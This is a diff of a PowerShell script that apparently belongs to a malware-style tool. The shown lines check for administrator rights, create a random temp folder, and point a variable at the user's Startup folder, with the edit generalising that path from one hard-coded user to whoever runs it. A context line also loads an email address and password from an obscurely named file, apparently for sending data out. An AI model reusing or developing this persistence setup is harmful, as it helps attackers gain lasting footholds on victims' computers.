@@ -20,7 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Set-Variable -Value (random_text) -Name wd
 Set-Variable -Value ("$env:temp\$wd") -Name path
 Set-Variable -Value (Get-Location) -Name INITIALPATH
-Set-Variable -Value ("C:\Users\darkd\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") -Name initial_dir
+Set-Variable -Name initial_dir -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Read Email and Password from Files
 Set-Variable -Name email -Value (Get-Content PkUbTvqXFIdB.txt)
